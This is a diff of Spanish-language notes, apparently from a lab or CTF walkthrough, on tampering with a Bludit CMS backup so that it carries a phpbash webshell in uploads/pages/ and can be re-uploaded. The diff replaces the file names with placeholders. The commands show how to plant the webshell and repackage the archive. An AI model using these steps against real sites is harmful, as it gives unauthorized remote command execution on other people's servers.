@@ -16,7 +16,7 @@ Esta hay que descargar la herramienta de phpbash ya que nos sera de mucha utilid
 
 // Modificar el backup 
 Ya dentro de la carpeta donde descargamos el backup haremos lo siguiente:
-unzip 2021-01-05-16-20-03.zip -d evil_backup
+unzip NOMBRE_DEL_ZIP.zip -d evil_backup
 
 2. Dentro de esa carpeta debe existir una ruta uploads/pages/. Copia ahí tu webshell (phpbash.php)
 cp phpbash.php evil_backup/uploads/pages/
@@ -29,7 +29,7 @@ cp phpbash.php evil_backup/uploads/pages/ (en mi caso no funciono asi que copeal
 rm -f evil_backup/.BLUDIT_BACKUP
 // Recomprime desde dentro de evil_backup, para que el zip no tenga una carpeta extra evil_backup/ adentro:
 cd evil_backup
-python3 -c "import shutil; shutil.make_archive('../2026-09-07-19-53-01', 'zip', '.')"
+python3 -c "import shutil; shutil.make_archive('../NOMBRE_DEL_ZIP_SIN_EXTENCION_.ZIP', 'zip', '.')"
 cd ..
 
 
